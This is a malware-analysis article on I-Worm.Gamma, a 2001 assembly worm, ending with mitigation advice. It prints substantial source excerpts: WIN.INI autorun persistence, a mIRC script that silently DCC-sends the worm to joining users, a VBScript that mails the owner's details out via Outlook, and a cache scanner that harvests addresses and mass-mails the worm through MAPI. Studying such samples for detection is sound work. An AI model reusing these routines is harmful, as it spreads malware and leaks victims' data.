# Dissecting I‑Worm.Gamma (w32gammaworm): A Multi‑Vector Assembly Worm 🛠️🔍

## Disclaimer
This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes.

## Introduction
I‑Worm.Gamma (late May–June 2001) is a 32‑bit Windows worm written in assembly. It blends multiple old‑school tactics: legacy WIN.INI persistence, mIRC `script.ini` auto‑send, a dropped VBScript that emails host details, and an autonomous emailer that harvests addresses from Internet Explorer cache and sends lures via Simple MAPI. Rather than exploiting vulnerabilities, Gamma relies on permissive defaults and user ecosystems of the era (mIRC, IE cache, default mail clients with MAPI enabled).

Analyzing its source shows deterministic strings, file paths, and API sequences that defenders can track. The sample also demonstrates a compact string‑scanning routine over memory‑mapped files to extract `mailto:` addresses, and a convenient include (`useful.inc`) supplying structures and small macros to make low‑level Windows API use manageable in TASM.

## Overview of the Malware 🐛
Gamma’s behavior is two‑phased depending on where it runs, with multiple propagation channels and light user‑facing effects.

- First‑run persistence: If not running from `%System%\SETUP.EXE`, the worm copies itself there and sets `WIN.INI` `[windows] run=` to the system copy. It then shows a decoy error message and exits.
- IRC propagation: When running from the system copy, it stages an mIRC `script.ini` that DCC‑sends the worm to users joining channels and deploys it across common mIRC paths.
- Telemetry mailer: Drops `C:\Data\info.vbs` that uses Outlook automation to send a short “Message from <owner>” to a fixed mailbox, then marks `HKLM\Software\Gamma = OK` to avoid resending.
- Harvest‑and‑mail: Waits for connectivity by resolving `www.symantec.com`, locates IE’s Temporary Internet Files (TIF) via the user Shell Folders “Cache” value, scans cached `.htm/.html` for `mailto:` links, and for each extracted address sends an email (via MAPI) with a Symantec‑themed subject and the worm attached as `SETUP.EXE`.
- Date/UI effects: On a Wednesday that falls on the 5th, it shows a greeting and swaps mouse buttons.

There is no C2. All spreading relies on local automation and address harvesting from the browser cache.

## Source Code Analysis 🔬
Gamma uses Kernel32 (file I/O, mapping, time, dirs), Advapi32 (registry), Ws2_32 (DNS resolve), User32 (UI, mouse), and MAPI32 (Simple MAPI). The include `useful.inc` contributes type defs (for example a WIN32_FIND_DATA‑like `win32` used for enumeration) and utility macros.

### Phase check, copy, and WIN.INI run
```asm
; Resolve current path and the intended system copy path
push 0
call GetModuleHandleA
push 50
push offset szOrig
push eax
call GetModuleFileNameA

push 50h
push offset szCopie
call GetSystemDirectoryA
push offset Copie              ; "\\SETUP.EXE"
push offset szCopie
call lstrcat

; If not already %System%\SETUP.EXE, copy and persist, then exit
push offset szOrig
push offset szCopie
call lstrcmp
test eax,eax
jz   MIRC                      ; already the system copy

push 0
push offset szCopie
push offset szOrig
call CopyFileA

push 50
push offset szWinini
call GetWindowsDirectoryA
push offset Winini             ; "\\WIN.INI"
push offset szWinini
call lstrcat
push offset szWinini
push offset szCopie
push offset run                ; key "run"
push offset windows            ; section "windows"
call WritePrivateProfileStringA

push 1010h
push offset szOrig
push offset TEXTE              ; "This file does not appear to be a Win32 valid file."
push 0
call MessageBoxA
jmp  FIN
```
- The worm pivots on a simple string compare: if the current module path equals `%System%\SETUP.EXE`, it proceeds; otherwise, it copies itself there, writes a legacy autorun to `WIN.INI`, shows an error, and exits. This makes mIRC/email operations run only from the persisted location.

### mIRC DCC auto‑send
```asm
; Create staging file with mIRC script contents and embedded path
CreateFileA "C:\\gamma", GENERIC_WRITE, FILE_SHARE_READ, ..., CREATE_ALWAYS, FILE_ATTRIBUTE_READONLY
WriteFile ..., mircd, MIRCTAILLE
CloseHandle ...

; Deploy to common mIRC script.ini paths
CopyFileA "C:\\gamma", "C:\\mirc\\script.ini", FALSE
CopyFileA "C:\\gamma", "C:\\mirc32\\script.ini", FALSE
CopyFileA "C:\\gamma", "C:\\progra~1\\mirc\\script.ini", FALSE
CopyFileA "C:\\gamma", "C:\\progra~1\\mirc32\\script.ini", FALSE
```
- The `mircd` blob includes a JOIN handler and a silent `/.dcc send` line constructed with the previously built `%System%\SETUP.EXE` path placed inside the data region:
```asm
mircd:
  db "[script]",0Dh,0Ah
  db ";Don't delete this file",0Dh,0Ah
  db "n0=ON 1:JOIN:#:{",0Dh,0Ah
  db "n1= /if ( $nick == $me ) { halt }",0Dh,0Ah
  db "n2= /.dcc send $nick "
  szCopie db 50 dup (0)   ; populated with %System%\SETUP.EXE
  db "",0Dh,0Ah
  db "n3=}",0Dh,0Ah
```
- On IRC channel joins, the mIRC client will attempt to DCC‑send the worm to the joining nick, skipping self.

### Dropped VBScript telemetry mailer
```asm
; Write C:\Data\info.vbs, then run it via wscript
CreateDirectoryA "C:\\Data"
CreateFileA      "C:\\Data\\info.vbs", GENERIC_WRITE, FILE_SHARE_READ, ..., CREATE_NEW, FILE_ATTRIBUTE_NORMAL
WriteFile ..., infod, INFOTAILLE
CloseHandle ...
WinExec "wscript C:\\Data\\info.vbs", 1
```
- The embedded VBScript (excerpted) sends a one‑time message using Outlook automation and then sets a marker under `HKLM\Software\Gamma`:
```vb
' info.vbs (excerpt – inert for analysis)
On Error Resume Next
set w = CreateObject("WScript.Shell")
If w.RegRead("HKLM\Software\Gamma\") <> "OK" Then
  set o = CreateObject("Outlook.Application")
  set m = o.CreateItem(0)
  n = w.RegRead("HKLM\...\RegisteredOwner")
  p = w.RegRead("HKLM\...\RegisteredOrganization")
  m.To = "<redacted>"
  m.Subject = "Message from " & n
  m.Body = "Time : " & time & vbCrLf & "Date : " & date & _
           vbCrLf & "Organization : " & p & vbCrLf & vbCrLf & "     I-Worm.Gamma"
  m.DeleteAfterSubmit = True
  m.Send
  w.RegWrite "HKLM\Software\Gamma\", "OK"
End If
```
- This acts as a telemetry ping; the address in the source is a now‑defunct mailbox and is redacted here.

### Date‑based UI effect
```asm
push offset SystemTime
call GetSystemTime
cmp  [SystemTime.wDayOfWeek], 3   ; Wednesday?
jne  NET
cmp  [SystemTime.wDay], 5         ; 5th?
jne  NET
push 40h
push offset TITRE2                ; "I‑Worm.Gamma (c)2001"
push offset TEXTE2                ; "PetiK greets you"
push 0
call MessageBoxA
push 1
call SwapMouseButton
```
- A harmless prank: on a matching Wednesday, shows a message and swaps mouse buttons.

### Connectivity check and IE cache harvesting
```asm
; Wait for DNS resolve as a proxy for connectivity
push offset symantec            ; "www.symantec.com"
call gethostbyname
jz   PAUSE                      ; sleep and retry if offline

; Read IE cache path and switch directory
RegOpenKeyExA HKEY_USERS, "...\Shell Folders", 0, KEY_QUERY_VALUE, &RegHandle
RegQueryValueExA RegHandle, "Cache", 0, &ValueType, szTif, 0x7F
RegCloseKey RegHandle
SetCurrentDirectoryA szTif

; Enumerate *.*htm* files
FindFirstFileA "*.*htm*", &CHERCHE    ; CHERCHE is a WIN32_FIND_DATA‑like struct
mov [SrchHandle], eax
call HTML
FindNextFileA [SrchHandle], &CHERCHE ...
```
- With the working directory set to TIF, it iterates cached HTML files. The `win32` structure type used for `CHERCHE` comes from `useful.inc` and mirrors `WIN32_FIND_DATA`.

### Memory‑mapped scan for "mailto:" and MAPI send
```asm
HTML:
  pushad
  CreateFileA CHERCHE.FileName, GENERIC_READ, FILE_SHARE_READ, ..., OPEN_EXISTING
  CreateFileMappingA ebx, 0, PAGE_READONLY, 0, 0, 0
  MapViewOfFile eax, FILE_MAP_READ, 0, 0, 0      ; esi = base
  GetFileSize ebx, 0                             ; ecx = size

  ; find the literal "mailto:" in the mapped view
ls_s_m: call @mt
        db 'mailto:'
@mt:    pop edi
l_s_m:  pushad
        mov ecx,7
        rep cmpsb
        popad
        je  s_m
        inc esi
        loop l_s_m

s_m:  add esi,7
      mov edi, offset mail_address
      xor edx, edx                 ; will track '@' seen
n_c:  lodsb
      cmp al,' '   je s_c
      cmp al,'"'   je e_c
      cmp al,'''"' je e_c
      cmp al,'@'   jne o_a
      inc edx
o_a:  stosb
      jmp n_c
s_c:  inc esi
      jmp n_c
e_c:  xor al,al
      stosb
      test edx, edx                ; skip strings without '@'
      je   ls_s_m

  ; Send one mail per extracted address using Simple MAPI
  xor  eax,eax
  push dword ptr [MAPISession]
  push eax eax eax eax eax        ; default profile
  call MAPILogon
  xor  eax,eax
  push eax, eax
  push offset Email               ; prebuilt MAPI structures in .data
  push eax
  push word ptr [MAPISession]
  call MAPISendMail
  xor  eax,eax
  push eax,eax,eax
  push dword ptr [MAPISession]
  call MAPILogoff
  jmp  ls_s_m
```
- The scanner uses a position‑independent trick (call/pop) to reference the literal `mailto:` in place. It then copies characters into `mail_address` until whitespace/quotes, ensuring an `@` was seen. For each address, it performs a Simple MAPI send using preinitialized descriptors in `.data` (From address is set to `snd@symantec.com`; the attachment is the worm binary path). The include file provides small helper macros and typed structs; here the code uses them mostly for clean data layout.

## Mitigation and Defense Strategies 🛡️
- Constrain client automation: Enforce Outlook/Default Mail Client policies that prompt or block Simple MAPI sends initiated by non‑UI processes. Monitor for `MAPILogon`/`MAPISendMail` sequences from unknown binaries and for `wscript.exe` spawning from arbitrary processes.
- Legacy autorun hygiene: Alert on `WIN.INI` `[windows] run=` changes and treat `%System%\SETUP.EXE` as suspicious when written by untrusted processes. Prefer baselined autorun policies, and block legacy persistence on supported systems.
- IRC controls: If IRC is permitted, disable or monitor mIRC `script.ini` automation. Hunt for JOIN‑triggered `/dcc send` lines referencing `%System%\SETUP.EXE` across `C:\mirc*` directories.
- Browser cache and exfil patterns: Detect processes enumerating IE TIF folders and memory‑mapping many `.htm/.html` files followed by MAPI activity. Network egress controls should block unsolicited SMTP or MAPI traffic from unapproved apps.
- Registry monitoring: Watch for reads of `HKEY_USERS\...\Shell Folders\Cache` by non‑browser processes and for creation of `HKLM\Software\Gamma` markers. Also alert on `SwapMouseButton` calls from non‑UI tooling.
- WSH restrictions: On legacy systems, disable or restrict Windows Script Host or Outlook automation to limit effects of the dropped `info.vbs` telemetry script.
- Least privilege and application control: Running without admin limits writes to HKLM and `%System%`. Use allow‑listing to block unknown binaries from writing to mIRC paths, Windows/System directories, and mail APIs.
- Incident response: Remove `%System%\SETUP.EXE`, revert `WIN.INI` run entries, delete deployed `script.ini` files, purge `C:\Data\info.vbs` and the `HKLM\Software\Gamma` marker, and hunt for sent emails originating from unexpected clients.

## Conclusion
I‑Worm.Gamma illustrates how compact native code can orchestrate an entire multi‑vector infection chain without exploits: WIN.INI autorun, mIRC DCC auto‑send, a one‑shot Outlook VBScript beacon, and a crawler that harvests `mailto:` links from the browser cache to mass‑mail the worm via Simple MAPI. Its operations are noisy and leave characteristic artifacts—file paths, registry keys, mIRC script content, and Symantec‑themed email text—that make it readily detectable. Hardening client automation, disabling legacy autoruns, and monitoring for the specific API sequences and strings highlighted here will neutralize Gamma‑style threats in legacy environments and provide clear triage and remediation paths.
